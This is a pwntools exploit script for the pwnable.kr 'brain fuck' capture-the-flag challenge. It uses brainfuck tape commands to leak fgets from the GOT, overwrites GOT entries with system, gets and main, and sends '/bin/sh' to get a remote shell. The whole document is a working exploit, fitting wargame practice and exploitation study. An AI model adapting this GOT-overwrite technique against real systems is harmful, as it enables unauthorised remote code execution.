from pwn import *

# host = 'localhost'
# port = 4000
host = 'pwnable.kr'
port = 9001

# libc = ELF('/root/Downloads/brain_fuck/libc.so.6')
libc = ELF('/root/Downloads/brain_fuck/bf_libc.so')
p_start     = 0x0804A0A0
memset_addr = 0x0804A02C
fgets_addr  = 0x0804A010
putchar_addr= 0x0804A030
main_addr   = 0x080484E0
gets_off   = libc.symbols['gets']
system_off = libc.symbols['system']
fgets_off  = libc.symbols['fgets']

payload = ''
# Move pointer to fgets_addr
payload += '<' * (p_start - fgets_addr)

# Leak fgets addr in libc
payload += '.>' * 0x04
payload += '<' * 0x04 # Rewind

# Replace fgets with system 
payload += ',>' * 0x04
payload += '<' * 0x04 # Rewind

# Move pointer to memset
payload += '>' * (memset_addr - fgets_addr)

# Replace memset with gets 
payload += ',>' * 0x04
payload += '<' * 0x04 # Rewind

# Move pointer to putchar_addr
payload += '>' * (putchar_addr - memset_addr)

# Replace putchar with main
payload += ',>' * 0x04

# Execute code
payload += '.'

r = remote(host, port)
r.recvuntil('[ ]\n')
r.sendline(payload)

# Read fgets libc addr
libc_fgets = unpack(r.recvn(4))

# Calc libc base
libc_addr = libc_fgets - fgets_off
print hex(libc_addr)

# Write system addr
r.send(p32(libc_addr + system_off))

# Write gets addr
r.send(p32(libc_addr + gets_off))

# Write main addr
r.send(p32(main_addr))

# Send string for gets
r.sendline('/bin/sh\x00')

r.interactive()
r.close()

